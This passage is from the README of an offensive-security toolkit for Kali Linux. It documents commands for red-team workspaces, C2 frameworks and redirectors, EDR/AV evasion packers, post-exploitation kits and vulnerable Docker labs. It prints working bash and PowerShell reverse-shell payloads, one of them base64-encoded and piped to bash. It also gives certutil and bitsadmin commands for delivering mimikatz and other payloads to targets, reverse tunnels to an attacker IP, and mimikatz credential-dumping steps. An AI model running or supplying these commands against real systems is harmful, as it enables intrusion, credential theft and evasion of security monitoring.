    [+] loot — Credentials and sensitive data
    [+] exploits — Exploitation attempts
    [+] reports — Reports and documentation

═══════════════════════════════════════════════════════
  AD WORKSPACE CREATED
═══════════════════════════════════════════════════════

  Location: /root/redteam/ad/corp.local
  Next:    cd /root/redteam/ad/corp.local && ./commands.sh
```

---

### 11. newpayload — Payload Workspace

Creates a structured payload development workspace.

```bash
newpayload <name> [windows|linux|web|macro|shellcode]

# Example
newpayload beacon-v2 windows
```

#### Output Example

```
  [*] Creating payload workspace: beacon-v2
  [*] Type: windows

    [+] src — Source code
    [+] src/c — C/C++ source
    [+] src/csharp — C# source
    [+] src/nim — Nim source
    [+] output — Compiled payloads
    [+] shellcode — Shellcode (raw, hex, base64)
    [+] obfuscated — Obfuscated versions
    [+] loaders — Custom loaders
    [+] encryptors — Encryption tools
    [+] test — Testing environment

═══════════════════════════════════════════════════════
  PAYLOAD WORKSPACE CREATED
═══════════════════════════════════════════════════════

  Location: /root/payloads/beacon-v2
  Next:    cd /root/payloads/beacon-v2/src/c
```

---

### 12. newredteam — Red Team Operation

Creates a structured Red Team operation workspace based on PTES methodology.

```bash
newredteam <operation_name>

# Example
newredteam operation_phoenix
```

#### Output Example

```
  [*] Creating Red Team operation: operation_phoenix

    [+] 01-pre-engagement — Rules of engagement, scope, ROE
    [+] 02-intelligence-gathering — OSINT, passive recon
    [+] 03-threat-modeling — Threat analysis, attack vectors
    [+] 04-vulnerability-analysis — Vuln analysis, PoC development
    [+] 05-exploitation — Exploitation attempts, C2 setup
    [+] 06-post-exploitation — Lateral movement, persistence
    [+] 07-reporting — Final reports, executive summary
    [+] c2 — C2 infrastructure and configs
    [+] tools — Custom tools and scripts
    [+] loot — Collected data (ENCRYPTED)
    [+] notes — Daily operation notes

═══════════════════════════════════════════════════════
  RED TEAM OPERATION WORKSPACE CREATED
═══════════════════════════════════════════════════════

  Location: /root/redteam/operations/operation_phoenix
  Next:    vim /root/redteam/operations/operation_phoenix/01-pre-engagement/operation-plan.md
```

---

### 13. setup-redirector — C2 Redirector

Interactive wizard to configure an Nginx C2 redirector with automatic Let's Encrypt SSL.

```bash
setup-redirector
```

#### Output Example

```
═══════════════════════════════════════════════════════
       C2 REDIRECTOR SETUP — OPSEC Automation
═══════════════════════════════════════════════════════

[1/5] Domain (e.g., cdn.example.com): cdn.example.com
[2/5] Backend protocol [https]: https
[3/5] Backend host (teamserver IP) [127.0.0.1]: 10.0.0.100
[4/5] Backend port [443]: 443
[5/5] C2 URI patterns (regex, comma-separated, e.g. ^/api,^/beacon): ^/api,^/beacon

[*] Testing nginx config...
nginx: the configuration file /etc/nginx/nginx.conf syntax is ok
nginx: configuration file /etc/nginx/nginx.conf test is successful

[*] Requesting Let's Encrypt SSL for cdn.example.com...
[!] Ensure DNS A record for cdn.example.com points to this server
Continue with certbot? [y/N]: y

[✔] Redirector ready!
  Domain:   https://cdn.example.com
  Backend:  https://10.0.0.100:443
  C2 URIs:  ^/api|^/beacon
  Config:   /etc/nginx/sites-available/cdn.example.com.conf
```

**List active redirectors:**
```bash
list-redirectors
```

```
=== Active C2 Redirectors ===
  [✔] cdn.example.com -> https://10.0.0.100:443
  [✔] api.example.com -> https://10.0.0.101:443
```

---

### 14. evasion-menu — EDR Evasion

Displays the EDR/AV evasion toolkit and available commands.

```bash
evasion-menu
```

#### Output Example

```
═══════════════════════════════════════════════════════
       EDR/AV EVASION TOOLKIT
═══════════════════════════════════════════════════════

[SHELLCODE GENERATORS]
  1) donut          — .NET/PE/VBS → PIC shellcode
  2) sgn             — Shikata Ga Nai encoder

[EDR BYPASS]
  3) scarecrow       — EDR bypass (DLL side-load)
  4) freeze          — Payload obfuscation
  5) inceptor        — AV/EDR bypass

[PE PACKERS & CRYPTERS]
  6) pezor           — PE packer
  7) nimcrypt2       — Nim-based PE crypter

[DETECTION TOOLS]
  8) pe-sieve        — detect in-memory hooks
  9) hollows-hunter  — find hollowed processes

[STATUS]
  10) Check installed tools

  0) Exit

Select [0-10]:
```

**Installed tools and usage:**

```bash
# Donut — convert .NET/PE/VBS to PIC shellcode
donut -f <input.exe> -o <output.bin>

# ScareCrow — EDR bypass via DLL side-loading
scarecrow -I <shellcode.bin> -Loader dll -domain <domain>

# SGN — Shikata Ga Nai shellcode encoder
sgn -i <shellcode.bin> -o <encoded.bin> -a 64 -c 2

# Freeze — payload obfuscation
freeze -payload <shellcode.bin> -loader dll -domain <domain>

# Inceptor — AV/EDR bypass template engine
inceptor <template.hb> -o <output.exe>

# Pezor — PE packer with shellcode injection
pezor <payload.exe> -o <packed.exe>

# PE-Sieve — detect in-memory hooks/patches
pe-sieve --pid <target_pid>

# Hollows Hunter — scan for hollowed/hooked processes
hollows-hunter

# Nimcrypt2 — Nim-based PE crypter
nimcrypt2 -f <payload.exe> -o <crypted.exe>
```

---

### 15. postexploit-menu — Post-Exploitation

Displays the post-exploitation kit and all available binaries.

```bash
postexploit-menu
```

#### Output Example

```
╔═══════════════════════════════════════════════════════╗
║   POST-EXPLOITATION TOOLKIT v2.0                      ║
║   Professional Post-Exploitation Menu                 ║
╚═══════════════════════════════════════════════════════╝

[1] HTTP SERVER & TRANSFER
  pe-server              — Start HTTP server (auto port)
  pe-server 9000         — Start on specific port
  pe-transfer <file>     — Quick file transfer

[2] LINUX PRIVILEGE ESCALATION
  linpeas                — Linux privilege escalation auditor
  pspy64                 — Unprivileged process monitor
  linux-exploit-suggester — Kernel exploit suggester
  suid3num               — SUID binary analyzer
  linenum                — Linux enumeration
  linuxprivchecker       — Privilege checker
  gtfobins-search        — GTFOBins search
  beroot                 — Linux privesc checker
  laZagne-linux          — Credential dump (Linux)

[3] WINDOWS PRIVILEGE ESCALATION
  /opt/postexploit/windows/winPEASx64.exe
  /opt/postexploit/windows/winPEASx86.exe
  /opt/postexploit/windows/PowerUp.ps1
  /opt/postexploit/windows/SharpUp.exe
  /opt/postexploit/windows/Seatbelt.exe

[4] CREDENTIAL DUMPING
  /opt/postexploit/windows/mimikatz.exe       — Windows credentials
  /opt/postexploit/windows/Rubeus.exe         — Kerberos attacks
  /opt/postexploit/windows/SafetyKatz.exe     — Safe Mimikatz

[5] COMMUNICATION TOOLS
  nc                     — Netcat (OpenBSD)
  ncat                   — Nmap's netcat
  socat                  — Multipurpose relay
  telnet                 — Telnet client
  cryptcat               — Encrypted netcat
  tsh                    — Tiny SHell

[6] TUNNELING & PIVOTING
  chisel                 — Fast TCP tunnel over HTTP
  ligolo-proxy           — Ligolo-ng server
  ligolo-agent           — Ligolo-ng agent
  /opt/postexploit/tunneling/rpivot/  — Reverse pivot
  /opt/postexploit/tunneling/ssf/     — Secure Socket Funneling

[7] REVERSE SHELL & UPGRADE
  revshell IP PORT [type] — Generate reverse shell
  Types: bash, python, nc, powershell, php, perl, ruby

  Listener:
    nc -lvnp 4444
    rlwrap nc -lvnp 4444  (with line editing)

  Shell Upgrade:
    python3 -c 'import pty;pty.spawn("/bin/bash")'
    Ctrl+Z → stty raw -echo → fg → export TERM=xterm

  0) Exit
```

**Installed tools and usage:**

```bash
# LinPEAS — Linux privilege escalation auditor
linpeas
linpeas -a                        # all checks
linpeas | tee linpeas_output.txt  # save output

# pspy — unprivileged process monitor (no root needed)
pspy64
pspy64 -pf -i 1000               # watch processes and file events

# Chisel — TCP/UDP tunneling over HTTP
# On attacker:
chisel server -p 8080 --reverse
# On target:
chisel client <attacker_ip>:8080 R:1080:socks

# ligolo-ng — advanced tunneling
# On attacker:
ligolo-proxy -selfcert -laddr 0.0.0.0:11601
# On target (upload ligolo-agent):
ligolo-agent -connect <attacker_ip>:11601 -ignore-cert

# Mimikatz — Windows credentials extraction
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords

# Rubeus — Kerberos attacks
Rubeus.exe kerberoast /format:hashcat
```

---

### 16. lab-manager — Docker Labs

Interactive Docker-based vulnerable lab manager with 30 labs across 8 categories.

```bash
# Interactive menu
lab-manager

# Direct commands
lab-manager start dvwa
lab-manager start webgoat
lab-manager stop all
lab-manager status
lab-manager logs dvwa
lab-manager shell dvwa

# Quick commands
start-lab dvwa
stop-lab dvwa
lab-status
```

#### Output Example (Interactive Menu)

```
╔═══════════════════════════════════════════════════════╗
║   OFFENSIVE DOCKER LAB MANAGER v2.0                   ║
║   30+ Vulnerable Labs • Port Management • Dashboard   ║
╚═══════════════════════════════════════════════════════╝

  Status: 5 running | 30 total

[LABS]
    1) Web Vulnerabilities      (DVWA, WebGoat, Juice Shop...)
    2) API Security             (vAPI, DVWS, REST Goat...)
    3) Active Directory         (Metasploit, VulnAD...)
    4) Network Security         (Nagios, ELK...)
    5) Mobile Security          (InsecureBank, DIVA...)
    6) Cloud Security           (LocalStack, CloudGoat...)
    7) CTF / Wargames           (HTB-style, Pwnable...)
    8) Reverse Engineering      (Malware Traffic, flAWS...)

[MANAGEMENT]
    9) Status Dashboard
    10) List All Labs
    11) Start Specific Lab
    12) Stop Specific Lab
    13) View Lab Logs
    14) Shell Access
    15) Stop ALL Labs

  0) Exit

  Select [0-15]:
```

#### Output Example (Start Lab)

```
═══════════════════════════════════════════════════════
  LAB STARTED SUCCESSFULLY
═══════════════════════════════════════════════════════

  Name:        dvwa
  Description: Damn Vulnerable Web Application
  Category:    web
  Image:       vulnerables/web-dvwa
  Port:        8080 → 80
  URL:         http://localhost:8080
  Username:    admin
  Password:    password

  Useful Commands:
    lab-manager logs dvwa
    lab-manager shell dvwa
    lab-manager stop dvwa

  [✔] dvwa is running
```

#### Available Labs (30 Labs)

| Category | Lab | URL | Credentials |
|----------|-----|-----|-------------|
| **Web** | DVWA | http://localhost:8080 | admin:password |
| **Web** | WebGoat | http://localhost:8081/WebGoat | guest:guest |
| **Web** | Juice Shop | http://localhost:3000 | admin@juice-sh.op:admin123 |
| **Web** | bWAPP | http://localhost:8082 | bee:bug |
| **Web** | Mutillidae | http://localhost:8083 | admin:admin |
| **Web** | NodeGoat | http://localhost:4000 | admin:admin |
| **Web** | RailsGoat | http://localhost:3001 | ken@owasp.org:ken123 |
| **Web** | crAPI | http://localhost:8888 | user@example.com:Admin123# |
| **Web** | DVGraphQL | http://localhost:5013 | admin:password |
| **Web** | WAVSEP | http://localhost:8084 | admin:password |
| **API** | vAPI | http://localhost:8085 | admin:password |
| **API** | DVWS | http://localhost:8086 | admin:password |
| **API** | REST Goat | http://localhost:8087 | admin:password |
| **AD** | Metasploit | host networking | msf:msf |
| **AD** | VulnAD | host networking | admin:Password1 |
| **AD** | Samba-vuln | smb://localhost:445 | admin:password |
| **Network** | Nagios | http://localhost:8088 | nagiosadmin:nagios |
| **Network** | ELK | http://localhost:5601 | elastic:changeme |
| **Network** | Security Ninja | http://localhost:8089 | admin:admin |
| **Mobile** | InsecureBank | http://localhost:9999 | dinesh:Welcome@123 |
| **Mobile** | DIVA | http://localhost:8090 | admin:admin |
| **Mobile** | UnCrackable | http://localhost:8091 | admin:admin |
| **Cloud** | LocalStack | http://localhost:4566 | aws:aws |
| **Cloud** | CloudGoat | http://localhost:5000 | admin:admin |
| **Cloud** | Kube-vuln | http://localhost:8092 | admin:admin |
| **CTF** | HTB Skeleton | http://localhost:8093 | admin:admin |
| **CTF** | Pwnable | http://localhost:8094 | admin:admin |
| **CTF** | CryptoHack | http://localhost:8095 | admin:admin |
| **RE** | Malware Traffic | http://localhost:8096 | admin:admin |
| **RE** | flAWS | http://localhost:8097 | admin:admin |

---

### 17. c2-menu — C2 Launcher

Interactive launcher for all installed C2 frameworks with status dashboard.

```bash
c2-menu

# Direct commands
c2-menu status
c2-menu start sliver
c2-menu details havoc
```

#### Output Example (Interactive Menu)

```
╔═══════════════════════════════════════════════════════╗
║   RED TEAM C2 FRAMEWORK LAUNCHER v2.0                 ║
║   8 C2 Frameworks • Status Dashboard • Connection Info║
╚═══════════════════════════════════════════════════════╝

[C2 FRAMEWORKS]
  ────────────────────────────────────────────────────────
  1) Sliver        — Modern multi-protocol C2
  2) Havoc         — Modern C2 with great UI
  3) Mythic        — Cross-platform C2 (Docker)
  4) Covenant      — .NET-based C2
  5) Empire        — Post-exploitation framework
  6) Starkiller    — Empire GUI
  7) Merlin        — HTTP/2 C2
  8) NimPlant      — Nim-based beacon

[MANAGEMENT]
  ────────────────────────────────────────────────────────
  9) Status Dashboard
  10) Show C2 Details

  0) Exit

Select [0-10]:
```

#### Output Example (Status Dashboard)

```
═══════════════════════════════════════════════════════
       C2 FRAMEWORK STATUS DASHBOARD
═══════════════════════════════════════════════════════

[COMMANDS]
  ────────────────────────────────────────────────────────
  [✔] sliver-server → /usr/local/bin/sliver-server
  [✔] havoc → /usr/local/bin/havoc
  [✔] mythic-cli → /usr/local/bin/mythic-cli
  [✔] covenant → /usr/local/bin/covenant
  [✔] empire → /usr/local/bin/empire
  [✔] starkiller → /usr/local/bin/starkiller
  [✔] merlin → /usr/local/bin/merlin
  [✔] nimplant → /usr/local/bin/nimplant

[PORTS]
  ────────────────────────────────────────────────────────
  [●] Port 31337 [LISTENING]
  [●] Port 40056 [LISTENING]
  [●] Port 7443 [LISTENING]
  [○] Port 1337 [NOT LISTENING]
  [○] Port 4173 [NOT LISTENING]
  [○] Port 50051 [NOT LISTENING]

[DIRECTORIES]
  ────────────────────────────────────────────────────────
  [✔] Havoc → /opt/Havoc
  [✔] Mythic → /opt/Mythic
  [✔] Covenant → /opt/Covenant
  [✔] Empire → /opt/Empire
  [✔] Starkiller → /opt/Starkiller
  [✔] merlin → /opt/merlin
  [✔] NimPlant → /opt/NimPlant

═══════════════════════════════════════════════════════
  Summary: 8 commands | 3 listening | 7 directories
═══════════════════════════════════════════════════════
```

#### Available C2 Frameworks

| Option | Framework | Protocol | Port | Default Credentials |
|--------|-----------|----------|------|---------------------|
| 1 | **Sliver** | mTLS / WireGuard / HTTP(S) | 31337 | — |
| 2 | **Havoc** | HTTPS / SMB | 40056 | 5pider / password1234 |
| 3 | **Mythic** | HTTPS (Docker) | 7443 | mythic_admin / Admin123! |
| 4 | **Covenant** | HTTPS (.NET) | 7443 | Create on first login |
| 5 | **Empire** | HTTPS / SMB | 1337 | empireadmin / password123 |
| 6 | **Starkiller** | Web UI | 4173 | — |
| 7 | **Merlin** | HTTP/2 / QUIC | 50051 | merlin |
| 8 | **NimPlant** | HTTPS | 31337 | — |

**Individual start commands:**
```bash
sliver-server                           # Sliver
havoc server                            # Havoc teamserver
mythic-cli start                        # Mythic
covenant                                # Covenant
empire server                           # Empire
starkiller                              # Starkiller GUI
merlin server                           # Merlin server
merlin client                           # Merlin client
nimplant server                         # NimPlant
```

---

### 18. pe-server — HTTP Server

Professional dynamic HTTP server for post-exploitation file serving with auto port selection.

```bash
pe-server [port]

# Examples
pe-server              # Use default port 8888
pe-server 9000         # Use port 9000
pe-server 0            # Auto-select free port
```

#### Output Example

```
═══════════════════════════════════════════════════════
  POST-EXPLOITATION HTTP SERVER
═══════════════════════════════════════════════════════

  Port:    8888
  Serving: /opt/postexploit

  Connection URLs:
  ────────────────────────────────────────────────────────
  → http://192.168.1.100:8888/  (local)
  → http://203.0.113.50:8888/   (public)

  Quick Download Commands:
  ────────────────────────────────────────────────────────
  Linux:
    wget http://192.168.1.100:8888/linux/linpeas.sh
    curl http://192.168.1.100:8888/linux/linpeas.sh -o linpeas.sh
    python3 -c 'import urllib.request; urllib.request.urlretrieve("http://192.168.1.100:8888/linux/linpeas.sh", "linpeas.sh")'

  Windows (PowerShell):
    IWR -Uri http://192.168.1.100:8888/windows/winPEASx64.exe -OutFile winPEAS.exe
    Invoke-WebRequest -Uri http://192.168.1.100:8888/windows/winPEASx64.exe -OutFile winPEAS.exe
    (New-Object Net.WebClient).DownloadFile("http://192.168.1.100:8888/windows/winPEASx64.exe", "winPEAS.exe")

  Windows (CMD):
    certutil -urlcache -split -f http://192.168.1.100:8888/windows/winPEASx64.exe winPEAS.exe
    bitsadmin /transfer download /priority high http://192.168.1.100:8888/windows/winPEASx64.exe winPEAS.exe

  Available Files:
  ────────────────────────────────────────────────────────
  Linux:
    • http://192.168.1.100:8888/linux/linpeas.sh
    • http://192.168.1.100:8888/linux/pspy64
    • http://192.168.1.100:8888/linux/pspy32
    • http://192.168.1.100:8888/linux/linux-exploit-suggester.sh

  Windows:
    • http://192.168.1.100:8888/windows/winPEASx64.exe
    • http://192.168.1.100:8888/windows/winPEASx86.exe
    • http://192.168.1.100:8888/windows/mimikatz.exe
    • http://192.168.1.100:8888/windows/Rubeus.exe

  Press Ctrl+C to stop the server
═══════════════════════════════════════════════════════
```

---

### 19. pe-transfer — File Transfer

Quick file transfer helper with automatic port selection.

```bash
pe-transfer <file> [target_ip]

# Examples
pe-transfer /path/to/file.exe
pe-transfer /path/to/file.exe 10.0.0.1
```

#### Output Example

```
  [*] File: payload.exe (2.3M)
  [*] From: 192.168.1.100

  [!] Starting temporary server on port 8889...

═══════════════════════════════════════════════════════
  TRANSFER COMMANDS
═══════════════════════════════════════════════════════

  Linux:
    wget http://192.168.1.100:8889/payload.exe
    curl http://192.168.1.100:8889/payload.exe -o payload.exe

  Windows (PowerShell):
    IWR -Uri http://192.168.1.100:8889/payload.exe -OutFile payload.exe

  Windows (CMD):
    certutil -urlcache -split -f http://192.168.1.100:8889/payload.exe payload.exe

  Netcat Alternative:
    # On attacker: nc -lvp 4444 < payload.exe
    # On target:   nc 192.168.1.100 4444 > payload.exe

  [!] Press Ctrl+C to stop server
```

---

### 20. revshell — Reverse Shell Generator

Professional reverse shell generator with 9 shell types.

```bash
revshell <ip> <port> [type]

# Types: bash, python, nc, powershell, php, perl, ruby, java, telnet

# Examples
revshell 10.0.0.1 4444 bash
revshell 10.0.0.1 4444 python
revshell 10.0.0.1 4444 powershell
```

#### Output Example (Bash)

```
═══════════════════════════════════════════════════════
  REVERSE SHELL — BASH
═══════════════════════════════════════════════════════

  Target: 10.0.0.1:4444

  Listener:
    nc -lvnp 4444

  Payload:
    bash -i >& /dev/tcp/10.0.0.1/4444 0>&1

  Base64 Encoded:
    echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash

═══════════════════════════════════════════════════════
```

#### Output Example (PowerShell)

```
═══════════════════════════════════════════════════════
  REVERSE SHELL — POWERSHELL
═══════════════════════════════════════════════════════

  Target: 10.0.0.1:4444

  Listener:
    nc -lvnp 4444

  Payload:
    powershell -NoP -NonI -W Hidden -Exec Bypass "$sm=New-Object Net.Sockets.TCPClient('10.0.0.1',4444);$s=$sm.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb + 'PS ' + (pwd).Path + '> ';$sb=([Text.Encoding]::ASCII).GetBytes($sb2);$s.Write($sb,0,$sb.Length);$s.Flush()};$sm.Close()"

═══════════════════════════════════════════════════════
```

---

### 21. secrets-manager — API Keys

Professional secrets manager for API keys and credentials.

```bash
secrets-manager [command]

# Commands: list, set, get, delete, test, backup, restore, encrypt, audit, profile
```

#### Output Example

```bash
# List all secrets
secrets-manager list

═══════════════════════════════════════════════════════
  SECRETS STATUS
═══════════════════════════════════════════════════════
  [✔] Permissions OK: 600

  INSTALLED TOOLS (42)
  ────────────────────────────────────────────────────────
    ✔ GITHUB_TOKEN = ghp_****xxxx
    ✔ SHODAN_API_KEY = ****xxxx
    ✔ AWS_ACCESS_KEY_ID = AKIA****xxxx
    ✗ AWS_SECRET_ACCESS_KEY [NOT SET]
    ✗ VIRUSTOTAL_API_KEY [NOT SET]
    ...

═══════════════════════════════════════════════════════
  Summary:
  Total:       42
  Configured:  15
  Empty:       27
═══════════════════════════════════════════════════════

# Set a secret
secrets-manager set GITHUB_TOKEN ghp_xxxxxxxxxxxx

# Test API keys
secrets-manager test

  Testing GitHub Token...
  [✔] GitHub Token: VALID (remaining: 4999 requests)
  Testing Shodan API...
  [✔] Shodan API: VALID
  Testing VirusTotal API...
  [✗] VirusTotal API: INVALID

# Security audit
secrets-manager audit

═══════════════════════════════════════════════════════
  SECURITY AUDIT
═══════════════════════════════════════════════════════
  Checking secrets.env permissions...
  [✔] Permissions: 600 (secure)
  Scanning for insecure files...
  [✔] No world-readable files
  Checking for empty secrets...
  [!] Found 27 empty secrets
  Checking for weak patterns...
  [✔] No weak patterns detected
  Checking backup encryption...
  [!] No encrypted backup (run: secrets-manager encrypt)

═══════════════════════════════════════════════════════
  ✔ Security audit passed
═══════════════════════════════════════════════════════
```

---

### 22. update-tools — Update Manager

Comprehensive 18-step update system with selective modes.

```bash
update-tools [OPTIONS] [COMPONENT]

# Options:
#   --dry-run        Simulate update without making changes
#   --skip-backup    Skip pre-update backup

# Components:
#   system, go, python, rust, c2, docker, nuclei, wordlists, shell, all

# Examples
update-tools                   # Full update
update-tools --dry-run         # Simulate update
update-tools system            # Update APT only
update-tools go python         # Update Go & Python
update-tools c2 docker         # Update C2 & Docker
```

#### Output Example

```
╔═══════════════════════════════════════════════════════╗
║   KALI MASTER — UPDATE MANAGER v6.7.1                 ║
║   18-Step Comprehensive Update System (FIXED)         ║
╚═══════════════════════════════════════════════════════╝

  Log: /var/log/kali_update_20260604_190831.log
  Started: 2026-06-04 19:08:31

═══════════════════════════════════════════════════════
  ▶ STEP 1/18 — PRE-UPDATE BACKUP
═══════════════════════════════════════════════════════
  [*] Creating system state backup...
  [✔] Backup created: /root/.kali-master/backups/system_state_20260604_190831.tar.gz (28K)

═══════════════════════════════════════════════════════
  ▶ STEP 4/18 — UPGRADE PACKAGES
═══════════════════════════════════════════════════════
  [*] Packages to upgrade: 11
  [✔] apt upgrade completed (11 packages)

═══════════════════════════════════════════════════════
  ▶ STEP 9/18 — UPDATE GO TOOLS
═══════════════════════════════════════════════════════
  [*] Updating subfinder...
  [✔]   subfinder updated
  [*] Updating httpx...
  [✔]   httpx updated
  ... (27 more)
  [✔] Go tools: 29 updated, 0 up-to-date

═══════════════════════════════════════════════════════
  ▶ STEP 12/18 — UPDATE C2 FRAMEWORKS
═══════════════════════════════════════════════════════
  [*] Updating Havoc...
  [✔]   Havoc updated
  [*] Updating Mythic...
  [✔]   Mythic updated
  [*] Updating Covenant...
  [✔]   Covenant updated
  ... (4 more)
  [✔] C2 frameworks: 7 updated

═══════════════════════════════════════════════════════
  UPDATE COMPLETE
═══════════════════════════════════════════════════════

  Duration:      14m 55s
  Log:           /var/log/kali_update_20260604_190831.log

  ✔ Success:     47
  ✗ Failed:      0
  ~ Skipped:    2
  ↑ Updated:     4 components

  🎉 All updates completed successfully!
```

---

### 23. kali-master — Dashboard

Central dashboard for managing all installed tools and checking system status.

```bash
kali-master [command]

# Commands:
#   status     — Show full dashboard (default)
#   fix        — Check missing tools
#   tools      — List all installed tools
#   venvs      — Python environments info
#   labs       — Docker labs status
#   c2         — C2 frameworks info
#   opsec      — OPSEC status
#   cloud      — Cloud tools info
#   certipy    — Certipy AD CS commands
#   evasion    — Evasion tools
#   postex     — Post-exploitation toolkit
```

#### Output Example (Status Dashboard)

```
╔═══════════════════════════════════════════════════════╗
║   KALI MASTER FRAMEWORK — PROFESSIONAL DASHBOARD      ║
║   v6.7.0 • Bug Bounty • Red Team • C2 • Labs          ║
╚═══════════════════════════════════════════════════════╝

[SYSTEM INFORMATION]
  ────────────────────────────────────────────────────────
  OS:       Kali GNU/Linux Rolling
  Kernel:   6.19.14+kali-amd64
  Hostname: kali
  CPU:      Intel Core i7-9750H (12 cores)
  RAM:      2.7Gi / 16Gi
  Disk:     50G / 100G (50% used)
  IP:       192.168.1.100
  Uptime:   2 hours, 15 minutes

[BUG BOUNTY TOOLS]
  ────────────────────────────────────────────────────────
  [✔] subfinder → /usr/local/bin/subfinder
       Version: 2.6.3
  [✔] httpx → /usr/local/bin/httpx
       Version: 1.5.0
  [✔] nuclei → /usr/local/bin/nuclei
       Version: 3.3.7
  ... (29 more)

[RED TEAM C2 FRAMEWORKS]
  ────────────────────────────────────────────────────────
  [✔] sliver-server → /usr/local/bin/sliver-server
  [✔] havoc → /usr/local/bin/havoc
  [✔] mythic-cli → /usr/local/bin/mythic-cli
  ... (5 more)

  C2 Directories:
    [✔] Havoc → /opt/Havoc
    [✔] Mythic → /opt/Mythic
    [✔] Covenant → /opt/Covenant
    ... (4 more)

═══════════════════════════════════════════════════════
  STATISTICS
═══════════════════════════════════════════════════════

  Total Tools:     106
  Installed:       106
  Missing:         0

  Completion:      100%
  [████████████████████████████████████████████████████]

  🎉 All tools are installed!

[QUICK COMMANDS]
  ────────────────────────────────────────────────────────
  kali-master status      → Show this dashboard
  kali-master fix         → Install missing tools
  kali-master tools       → List all installed tools
  kali-master venvs       → Python environments info
  kali-master labs        → Docker labs status
  kali-master c2          → C2 frameworks info
  kali-master opsec       → OPSEC tools status
  kali-master cloud       → Cloud tools info
  c2-menu                 → Interactive C2 launcher
  lab-manager             → Interactive lab manager
  postexploit-menu        → Post-exploitation toolkit
  update-tools            → Update all tools
  bb-recon <domain>       → Bug bounty recon
```

---

### 24. check_tools_status — Tool Status

Quick tool status checker with category breakdown.

```bash
check_tools_status [mode]

# Modes:
#   all        — Check all tools (default)
#   critical   — Check critical tools only
#   missing    — Show missing tools only
#   bugbounty  — Check Bug Bounty tools
#   network    — Check Network tools
#   cloud      — Check Cloud tools
#   c2         — Check C2 frameworks
#   postex     — Check Post-Exploitation tools
```

#### Output Example

```
═══════════════════════════════════════════════════════
  TOOL STATUS CHECK
═══════════════════════════════════════════════════════

[PHASE 1/4] INITIALIZING HEALTH CHECK
  ✔ Health check initialized
    • 9 categories
    • Smart auto-fix enabled

[PHASE 2/4] SCANNING TOOLS BY CATEGORY

  [Bug Bounty Tools] (28 tools)
  ────────────────────────────────────────────────────────
    [✔] nuclei → /usr/local/bin/nuclei
    [✔] subfinder → /usr/local/bin/subfinder
    ... (26 more)

    Category Status: 28/28 (100%)

  [C2 Frameworks] (8 tools)
  ────────────────────────────────────────────────────────
    [✔] sliver-server → /usr/local/bin/sliver-server
    [✔] havoc → /usr/local/bin/havoc
    ... (6 more)

    Category Status: 8/8 (100%)

  CATEGORY BREAKDOWN
  ────────────────────────────────────────────────────────
    ✔ Bug Bounty Tools: 28/28 (100%)
    ✔ Network & Exploitation: 10/10 (100%)
    ✔ Reverse Engineering: 16/16 (100%)
    ✔ C2 Frameworks: 8/8 (100%)
    ✔ Cloud Security: 5/5 (100%)
    ✔ EDR/AV Evasion: 7/7 (100%)
    ✔ Post-Exploitation: 4/4 (100%)
    ✔ Active Directory: 4/4 (100%)
    ✔ Runtimes & Core: 7/7 (100%)

  OVERALL STATUS
  ────────────────────────────────────────────────────────
    [████████████████████████████████████████████████████] 100%

[PHASE 4/4] AUTO-FIX DECISION
  ✔ All tools installed successfully!

═══════════════════════════════════════════════════════
  HEALTH CHECK COMPLETE
═══════════════════════════════════════════════════════

  Duration:       0m 45s
  Total Checked:  106 items
  Passed:         106 items
  Failed:         0 items
  Success Rate:   100%

  🎉 All tools are installed!

  Quick Commands:
    kali-master status       → Show dashboard
    kali-master fix          → Check missing tools
    kali-master tools        → List all tools
    c2-menu                  → C2 launcher
    lab-manager              → Lab manager
```

---

### 25. helper-menu — Interactive Menu

Interactive menu for all helper scripts.

```bash
helper-menu
```

#### Output Example

```
═══════════════════════════════════════════════════════
       KALI MASTER — HELPER SCRIPTS MENU
═══════════════════════════════════════════════════════

[WORKSPACE CREATORS]
  1) newbb <domain>          → Bug Bounty workspace
  2) newctf <name>           → CTF workspace
  3) newad <domain>          → Active Directory workspace
  4) newpayload <name>       → Payload development workspace
  5) newredteam <name>       → Red Team operation

[RECONNAISSANCE]
  6) bb-recon <domain>       → Bug bounty recon (12 steps)
  7) sub-enum <domain>       → Subdomain enumeration
  8) api-recon <url>         → API reconnaissance
  9) cloud-recon <target>    → Cloud enumeration
  10) port-scan <target>     → Port scanning
  11) dir-fuzz <url>         → Directory fuzzing
  12) vuln-scan <target>     → Vulnerability scanning

[UTILITIES]
  13) merge-results          → Merge scan results
  14) report-gen <dir>       → Generate report
  15) notify-recon           → Send notifications

  0) Exit

Select [0-15]:
```

---

## 📁 Directory Structure

```
/
├── opt/
│   ├── kali-venv/               # Central Python virtual environment (289 packages)
│   ├── angr-venv/               # Isolated angr environment (45 packages)
│   ├── flare-venv/              # Isolated FLARE environment (12 packages)
│   ├── c2-frameworks/           # C2 framework base directory
│   ├── c2-redirectors/          # Nginx redirector configs + templates
│   │   ├── sites-available/
│   │   ├── sites-enabled/
│   │   ├── templates/
│   │   └── logs/
│   ├── evasion-tools/           # EDR/AV evasion binaries and source
│   │   ├── donut/               # Donut binary + source
│   │   ├── ScareCrow/           # ScareCrow binary + source
│   │   ├── sgn/                 # SGN binary + source
│   │   ├── pe-sieve/            # PE-Sieve build
│   │   ├── hollows_hunter/      # Hollows Hunter build
│   │   └── nimcrypt2/           # Nimcrypt2 binary + source
│   ├── postexploit/             # Post-exploitation binaries
│   │   ├── linux/               # LinPEAS, pspy (8 tools)
│   │   ├── windows/             # WinPEAS, mimikatz, Rubeus, SharpUp (10 tools)
│   │   └── tunneling/           # chisel, ligolo-ng, rpivot, ssf (4 tools)
│   ├── tools/                   # Misc tool directory
│   │   ├── bin/
│   │   ├── wordlists/
│   │   ├── exploits/
│   │   ├── scripts/
│   │   ├── payloads/
│   │   └── github/              # Python GitHub-cloned tools
│   ├── wordlists/               # Wordlist symlinks
│   │   ├── SecLists/            # 19,000+ files
│   │   └── web/
│   │       ├── fuzzdb/
│   │       └── PayloadsAllTheThings/
│   ├── Havoc/                   # Havoc C2
│   ├── Mythic/                  # Mythic C2
│   ├── Covenant/                # Covenant C2
│   ├── Empire/                  # Empire C2
│   ├── Starkiller/              # Starkiller GUI
